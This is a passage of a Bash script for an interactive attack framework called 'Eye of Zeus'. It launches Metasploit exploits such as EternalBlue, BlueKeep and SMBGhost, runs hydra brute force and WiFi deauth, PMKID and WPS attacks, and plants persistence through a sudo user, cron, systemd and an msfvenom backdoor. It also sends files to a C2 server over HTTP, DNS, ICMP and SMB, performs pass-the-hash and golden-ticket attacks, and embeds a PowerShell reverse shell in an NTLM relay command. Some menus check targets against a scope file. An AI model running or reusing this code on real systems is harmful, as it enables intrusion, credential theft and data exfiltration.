    echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option: ${RESET}"
    read -r choice

    case $choice in
        1)
            banner
            modern_header "SMB EXPLOITATION"
            require_tool msfconsole metasploit-framework || return
            local target; target="$(prompt_valid "[?] Enter target IP:" is_ip)"
            scope_guard "$target" || return
            echo -e "\n${HYPR_CYAN}${BOLD}1) EternalBlue (MS17-010)${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}2) BlueKeep (CVE-2019-0708)${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}3) SMBGhost (CVE-2020-0796)${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}4) Brute Force${RESET}"
            echo -e "${DEBIAN_RED}${BOLD}5) Back${RESET}"
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select exploit:${RESET}"
            read -r exploit

            case $exploit in
                1)
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Launching EternalBlue exploit...${RESET}"
                    msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $target; set LHOST $(hostname -I | awk '{print $1}'); exploit"
                    ;;
                2)
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Launching BlueKeep exploit...${RESET}"
                    msfconsole -q -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS $target; set LHOST $(hostname -I | awk '{print $1}'); exploit"
                    ;;
                3)
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Launching SMBGhost (SMBv3 compression) remote exploit...${RESET}"
                    # Remote RCE via the Metasploit module (Msf::Exploit::Remote),
                    # same style as EternalBlue/BlueKeep above. Beats the fragile
                    # exploit-db PoC, which carries hardcoded shellcode.
                    msfconsole -q -x "use exploit/windows/smb/cve_2020_0796_smbghost; set RHOSTS $target; set LHOST $(hostname -I | awk '{print $1}'); set payload windows/x64/meterpreter/reverse_tcp; exploit"
                    ;;
                4)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter username:${RESET}"
                    read -r user
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Starting SMB brute force...${RESET}"
                    hydra -l "$user" -P /usr/share/wordlists/rockyou.txt smb://"$target" -t 10
                    ;;
                5)
                    return
                    ;;
                *)
                    echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
                    ;;
            esac
            ;;
        2)
            banner
            modern_header "RDP EXPLOITATION"
            local target; target="$(prompt_valid "[?] Enter target IP:" is_ip)"
            scope_guard "$target" || return
            echo -e "\n${HYPR_CYAN}${BOLD}1) BlueKeep (CVE-2019-0708)${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}2) Brute Force${RESET}"
            echo -e "${DEBIAN_RED}${BOLD}3) Back${RESET}"
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select exploit:${RESET}"
            read -r exploit

            case $exploit in
                1)
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Launching BlueKeep exploit...${RESET}"
                    msfconsole -q -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS $target; set LHOST $(hostname -I | awk '{print $1}'); exploit"
                    ;;
                2)
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Starting RDP brute force...${RESET}"
                    hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/rockyou.txt rdp://"$target" -t 10
                    ;;
                3)
                    return
                    ;;
                *)
                    echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
                    ;;
            esac
            ;;
        3)
            banner
            modern_header "WEB EXPLOITATION"
            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target URL:${RESET}"
            read -r url
            echo -e "\n${HYPR_CYAN}${BOLD}1) SQL Injection${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}2) XSS${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}3) LFI/RFI${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}4) Brute Force${RESET}"
            echo -e "${DEBIAN_RED}${BOLD}5) Back${RESET}"
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select exploit:${RESET}"
            read -r exploit

            case $exploit in
                1)
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Starting SQL injection scan...${RESET}"
                    sqlmap -u "$url" --batch --level=5 --risk=3
                    ;;
                2)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter XSS payload:${RESET}"
                    read -r payload
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Testing XSS payload...${RESET}"
                    curl -s "$url" --data-urlencode "input=$payload"
                    ;;
                3)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter LFI/RFI payload (e.g., ../../../../etc/passwd):${RESET}"
                    read -r payload
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Testing LFI/RFI...${RESET}"
                    curl -s "$url?page=$payload"
                    ;;
                4)
                    # hydra wants the host separately from the request path; a full
                    # URL as the target argument is rejected.
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target host or IP (e.g., 192.168.1.10):${RESET}"
                    read -r login_host
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter login path (e.g., /login.php):${RESET}"
                    read -r login_path
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter failure string shown on bad login (e.g., Invalid):${RESET}"
                    read -r fail_str
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Starting web brute force...${RESET}"
                    hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/rockyou.txt "$login_host" http-post-form "${login_path}:username=^USER^&password=^PASS^:${fail_str}" -t 10
                    ;;
                5)
                    return
                    ;;
                *)
                    echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
                    ;;
            esac
            ;;
        4)
            banner
            modern_header "WIFI EXPLOITATION"
            echo -e "${HYPR_CYAN}${BOLD}1) WPA Handshake Capture${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}2) PMKID Attack${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}3) WPS Attack${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}4) Deauthentication Attack${RESET}"
            echo -e "${DEBIAN_RED}${BOLD}5) Back${RESET}"
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option:${RESET}"
            read -r wifi_choice

            case $wifi_choice in
                1)
                    require_tool airmon-ng aircrack-ng || return
                    require_tool airodump-ng aircrack-ng || return
                    local interface; interface="$(select_interface wifi)" || return
                    local bssid; bssid="$(prompt_valid "[?] Enter target BSSID:" is_mac)"
                    scope_guard "$bssid" || return
                    local channel; channel="$(prompt_valid "[?] Enter target channel (1-165):" is_port)"
                    local mon_iface
                    mon_iface="$(airmon-ng start "$interface" | grep -oE '[a-z0-9]+mon' | tail -1)"
                    [ -z "$mon_iface" ] && mon_iface="${interface}mon"
                    track_mon "$mon_iface"
                    local hs_prefix; hs_prefix="$(loot "handshakes/handshake_$(date +%H%M%S)")"
                    airodump-ng -c "$channel" --bssid "$bssid" -w "$hs_prefix" "$mon_iface" &
                    local dump_pid=$!; track_pid "$dump_pid"
                    sleep 10
                    aireplay-ng -0 5 -a "$bssid" "$mon_iface"
                    sleep 10
                    kill "$dump_pid" 2>/dev/null
                    airmon-ng stop "$mon_iface" 2>/dev/null
                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] Handshake capture saved to ${hs_prefix}-01.cap${RESET}"
                    maybe_crack handshake "${hs_prefix}-01.cap" "$bssid"
                    ;;
                2)
                    require_tool hcxdumptool hcxtools || return
                    local conv; conv="$(hcx_convert_tool)"
                    if [ -z "$conv" ]; then require_tool hcxpcapngtool hcxtools; return; fi
                    local interface; interface="$(select_interface wifi)" || return
                    local bssid; bssid="$(prompt_valid "[?] Enter target BSSID:" is_mac)"
                    scope_guard "$bssid" || return
                    # hcxdumptool 6.3.0+/7.x dropped --filterlist_ap/--filtermode/-o/--enable_status.
                    # Filtering is now done with a compiled Berkeley Packet Filter (--bpf),
                    # output is -w, and the live status display is --rds. hcxdumptool also
                    # manages the interface itself, so do NOT put the card into monitor mode.
                    local bssid_raw bpf_file="/tmp/eoz_pmkid_filter.bpf"
                    local pcap; pcap="$(loot "handshakes/pmkid_$(date +%H%M%S).pcapng")"
                    local hashf; hashf="$(loot "hashes/pmkid_$(date +%H%M%S).22000")"
                    bssid_raw="$(echo "$bssid" | tr -d ':-' | tr 'A-F' 'a-f')"
                    echo -e "${HYPR_YELLOW}${BOLD}[*] Capturing for 60s (Ctrl+C to stop early)...${RESET}"
                    if hcxdumptool --bpfc="wlan addr3 ${bssid_raw}" > "$bpf_file" 2>/dev/null && [ -s "$bpf_file" ]; then
                        timeout 60 hcxdumptool -i "$interface" -w "$pcap" --bpf="$bpf_file" --rds=1 \
                            || timeout 60 hcxdumptool -i "$interface" -w "$pcap" --rds=1
                    else
                        echo -e "${DEBIAN_RED}${BOLD}[!] BPF filter failed; capturing all APs.${RESET}"
                        timeout 60 hcxdumptool -i "$interface" -w "$pcap" --rds=1
                    fi
                    "$conv" -o "$hashf" "$pcap"
                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] PMKID hash saved to $hashf (hashcat -m 22000).${RESET}"
                    maybe_crack 22000 "$hashf"
                    ;;
                3)
                    require_tool reaver || return
                    local interface; interface="$(select_interface wifi)" || return
                    local bssid; bssid="$(prompt_valid "[?] Enter target BSSID:" is_mac)"
                    scope_guard "$bssid" || return
                    reaver -i "$interface" -b "$bssid" -vv
                    ;;
                4)
                    require_tool airmon-ng aircrack-ng || return
                    require_tool aireplay-ng aircrack-ng || return
                    local interface; interface="$(select_interface wifi)" || return
                    local bssid; bssid="$(prompt_valid "[?] Enter target BSSID:" is_mac)"
                    scope_guard "$bssid" || return
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter client MAC (leave empty for broadcast):${RESET}"
                    read -r client
                    if [ -n "$client" ] && ! is_mac "$client"; then
                        echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid client MAC${RESET}"; return
                    fi
                    local mon_iface
                    mon_iface="$(airmon-ng start "$interface" | grep -oE '[a-z0-9]+mon' | tail -1)"
                    [ -z "$mon_iface" ] && mon_iface="${interface}mon"
                    track_mon "$mon_iface"
                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] Deauth running (Ctrl+C to stop and restore card)${RESET}"
                    trap 'restore_all; trap - INT; return' INT
                    if [ -z "$client" ]; then
                        aireplay-ng -0 0 -a "$bssid" "$mon_iface"
                    else
                        aireplay-ng -0 0 -a "$bssid" -c "$client" "$mon_iface"
                    fi
                    airmon-ng stop "$mon_iface" 2>/dev/null
                    ;;
                5)
                    return
                    ;;
                *)
                    echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
                    ;;
            esac
            ;;
        5)
            banner
            modern_header "ZERO-DAY EXPLOITATION"
            echo -e "${HYPR_CYAN}${BOLD}1) Search for exploits${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}2) Run exploit${RESET}"
            echo -e "${DEBIAN_RED}${BOLD}3) Back${RESET}"
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option:${RESET}"
            read -r zero_choice

            case $zero_choice in
                1)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter search term:${RESET}"
                    read -r search_term
                    searchsploit "$search_term"
                    ;;
                2)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter exploit path:${RESET}"
                    read -r exploit_path
                    if [ ! -f "$exploit_path" ]; then
                        echo -e "${DEBIAN_RED}${BOLD}[✗] Exploit not found: $exploit_path${RESET}"; return
                    fi
                    local target; target="$(prompt_valid "[?] Enter target IP:" is_ip)"
                    scope_guard "$target" || return
                    python3 "$exploit_path" "$target"
                    ;;
                3)
                    return
                    ;;
                *)
                    echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
                    ;;
            esac
            ;;
        6)
            return
            ;;
        *)
            echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
            ;;
    esac
    echo -e "\n${HYPR_YELLOW}${BOLD}[↵] Press Enter to continue...${RESET}"
    read -r
}

# Post-exploitation
post_exploitation() {
    banner
    modern_header "POST-EXPLOITATION MODULE"
    echo -e "${HYPR_CYAN}${BOLD}1) Persistence${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}2) Data Exfiltration${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}3) Privilege Escalation${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}4) Lateral Movement${RESET}"
    echo -e "${DEBIAN_RED}${BOLD}5) Back to Main Menu${RESET}"
    echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option: ${RESET}"
    read -r choice

    case $choice in
        1)
            banner
            modern_header "PERSISTENCE"
            echo -e "${HYPR_CYAN}${BOLD}1) Add User${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}2) Cron Job${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}3) Systemd Service${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}4) Backdoor${RESET}"
            echo -e "${DEBIAN_RED}${BOLD}5) Back${RESET}"
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option:${RESET}"
            read -r persist_choice

            case $persist_choice in
                1)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter username:${RESET}"
                    read -r username
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter password:${RESET}"
                    read -r password
                    useradd -m -p "$(openssl passwd -1 "$password")" -s /bin/bash "$username"
                    usermod -aG sudo "$username"
                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] User $username added with sudo privileges${RESET}"
                    ;;
                2)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter command to run:${RESET}"
                    read -r command
                    (crontab -l 2>/dev/null; echo "@reboot $command") | crontab -
                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] Cron job added${RESET}"
                    ;;
                3)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter service name:${RESET}"
                    read -r service_name
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter command to run:${RESET}"
                    read -r command
                    echo "[Unit]
Description=$service_name
After=network.target

[Service]
ExecStart=$command
Restart=always

[Install]
WantedBy=multi-user.target" > "/etc/systemd/system/$service_name.service"
                    systemctl enable "$service_name"
                    systemctl start "$service_name"
                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] Systemd service $service_name created${RESET}"
                    ;;
                4)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter listener IP:${RESET}"
                    read -r lhost
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter listener port:${RESET}"
                    read -r lport
                    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf > "/tmp/backdoor"
                    chmod +x "/tmp/backdoor"
                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] Backdoor created at /tmp/backdoor${RESET}"
                    ;;
                5)
                    return
                    ;;
                *)
                    echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
                    ;;
            esac
            ;;
        2)
            banner
            modern_header "DATA EXFILTRATION"
            echo -e "${HYPR_CYAN}${BOLD}1) HTTP${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}2) DNS${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}3) ICMP${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}4) SMB${RESET}"
            echo -e "${DEBIAN_RED}${BOLD}5) Back${RESET}"
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option:${RESET}"
            read -r exfil_choice

            case $exfil_choice in
                1)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter file to exfiltrate:${RESET}"
                    read -r file
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter C2 server URL:${RESET}"
                    read -r url
                    curl -F "file=@$file" "$url"
                    ;;
                2)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter file to exfiltrate:${RESET}"
                    read -r file
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter domain for exfiltration:${RESET}"
                    read -r domain
                    for line in $(xxd -p -c 16 "$file"); do
                        dig "$line.$domain" +short
                    done
                    ;;
                3)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter file to exfiltrate:${RESET}"
                    read -r file
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter C2 server IP:${RESET}"
                    read -r ip
                    for line in $(xxd -p -c 16 "$file"); do
                        ping -c 1 -p "$line" "$ip"
                    done
                    ;;
                4)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter file to exfiltrate:${RESET}"
                    read -r file
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter SMB share (e.g., \\\\192.168.1.100\\share):${RESET}"
                    read -r share
                    smbclient "$share" -c "put $file"
                    ;;
                5)
                    return
                    ;;
                *)
                    echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
                    ;;
            esac
            ;;
        3)
            banner
            modern_header "PRIVILEGE ESCALATION"
            echo -e "${HYPR_CYAN}${BOLD}1) Linux${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}2) Windows${RESET}"
            echo -e "${DEBIAN_RED}${BOLD}3) Back${RESET}"
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option:${RESET}"
            read -r priv_choice

            case $priv_choice in
                1)
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Running Linux privilege escalation checks...${RESET}"
                    wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh -O /tmp/linpeas.sh
                    chmod +x /tmp/linpeas.sh
                    /tmp/linpeas.sh
                    ;;
                2)
                    echo -e "${DEBIAN_BLUE}${BOLD}[*] Running Windows privilege escalation checks...${RESET}"
                    wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEASx64.exe -O /tmp/winpeas.exe
                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] Download winPEAS to target and run it${RESET}"
                    ;;
                3)
                    return
                    ;;
                *)
                    echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
                    ;;
            esac
            ;;
        4)
            banner
            modern_header "LATERAL MOVEMENT"
            echo -e "${HYPR_CYAN}${BOLD}1) Pass-the-Hash${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}2) Golden Ticket${RESET}"
            echo -e "${HYPR_CYAN}${BOLD}3) SMB Relay${RESET}"
            echo -e "${DEBIAN_RED}${BOLD}4) Back${RESET}"
            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option:${RESET}"
            read -r lateral_choice

            case $lateral_choice in
                1)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target IP:${RESET}"
                    read -r target
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter username:${RESET}"
                    read -r user
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter NTLM hash:${RESET}"
                    read -r hash
                    pth-winexe -U "$user"%"$hash" //"$target" cmd.exe
                    ;;
                2)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter domain:${RESET}"
                    read -r domain
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter domain SID:${RESET}"
                    read -r sid
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter KRBTGT hash:${RESET}"
                    read -r krb_hash
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter username:${RESET}"
                    read -r user
                    ticketer.py -nthash "$krb_hash" -domain-sid "$sid" -domain "$domain" "$user"
                    export KRB5CCNAME="$user.ccache"
                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] Golden ticket created for $user@$domain${RESET}"
                    ;;
                3)
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target IP:${RESET}"
                    read -r target
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter listener IP:${RESET}"
                    read -r lhost
                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter listener port:${RESET}"
                    read -r lport
                    echo "$target" > /tmp/eoz_targets.txt
                    impacket-ntlmrelayx -tf /tmp/eoz_targets.txt -smb2support -c "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};"
                    ;;
                4)
                    return
                    ;;
                *)
                    echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
                    ;;
            esac
            ;;
        5)
            return
            ;;
        *)
            echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
            ;;
    esac
    echo -e "\n${HYPR_YELLOW}${BOLD}[↵] Press Enter to continue...${RESET}"
    read -r
}

# Session & report menu
session_menu() {
    banner
    modern_header "SESSION & REPORT"
    echo -e "${HYPR_CYAN}${BOLD}1) Generate report${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}2) Show loot directory${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}3) Self-update (git pull)${RESET}"
    echo -e "${HYPR_CYAN}${BOLD}4) About / version${RESET}"
    echo -e "${DEBIAN_RED}${BOLD}5) Back${RESET}"
    echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option: ${RESET}"
    read -r s_choice

    case $s_choice in
        1) generate_report ;;
        2) echo -e "${HYPR_CYAN}${BOLD}Loot: $LOOT_DIR${RESET}"; ls -la "$LOOT_DIR" ;;
        3) self_update ;;
        4) show_version
           echo -e "${HYPR_CYAN}Loot:  $LOOT_DIR${RESET}"
           echo -e "${HYPR_CYAN}Scope: ${SCOPE_FILE:-none}${RESET}" ;;
        5) return ;;
        *) echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}" ;;
    esac
    echo -e "\n${HYPR_YELLOW}${BOLD}[↵] Press Enter to continue...${RESET}"
    read -r
}

# Main menu
main_menu() {
    while true; do
        banner
        modern_header "MAIN MENU"
        menu_item 1 "Network Discovery"
        menu_item 2 "MITM Attacks"
        menu_item 3 "Exploitation"
        menu_item 4 "Post-Exploitation"
        menu_item 5 "Session & Report"
        menu_item 6 "Exit" "$DEBIAN_RED"
        echo -ne "\n${HYPR_YELLOW}${BOLD}[?] Select option: ${RESET}"
        read -r choice

        case $choice in
            1)
                network_discovery
                ;;
            2)
                mitm_attacks
                ;;
            3)
                exploitation
                ;;
            4)
                post_exploitation
                ;;
            5)
                session_menu
                ;;
            6)
                echo -e "${DEBIAN_GREEN}${BOLD}[✓] Exiting Eye of Zeus... Stay stealthy!${RESET}"
                exit 0
                ;;
            *)
                echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}"
                sleep 1
                ;;
        esac
    done
}

# Main function
main() {
    # CLI flags (these run before the root check so --help/--version/--update work
    # for an unprivileged user).
    while [ $# -gt 0 ]; do
        case "$1" in
            -h|--help)    show_help; exit 0 ;;
            -V|--version) show_version; exit 0 ;;
            --update)     self_update; exit $? ;;
            --scope)      EOZ_SCOPE_FILE="$2"; shift ;;
            --no-scope)   EOZ_NO_SCOPE=1 ;;
            --loot)       EOZ_LOOT_BASE="$2"; shift ;;
            *) echo "Unknown option: $1"; show_help; exit 1 ;;
        esac
        shift
    done

    check_root
    load_scope
    init_loot
    start_session_log
    banner
    type_text ">> Booting Eye of Zeus attack framework..." "$HYPR_MAGENTA" 0.01
    loading_bar "Initializing modules" 24 0.015
    check_dependencies
    echo -e "${HYPR_CYAN}${BOLD}[i] Loot directory: $LOOT_DIR${RESET}"
    if [ -s "$SCOPE_FILE" ]; then
        echo -e "${HYPR_CYAN}${BOLD}[i] Scope: $SCOPE_FILE${RESET}"
    else
        echo -e "${HYPR_YELLOW}${BOLD}[i] Scope: none ($SCOPE_FILE) — targets will require confirmation${RESET}"
    fi
    type_text ">> Ready. Launching console..." "$DEBIAN_GREEN" 0.01
    sleep 0.4
    main_menu
}

main "$@"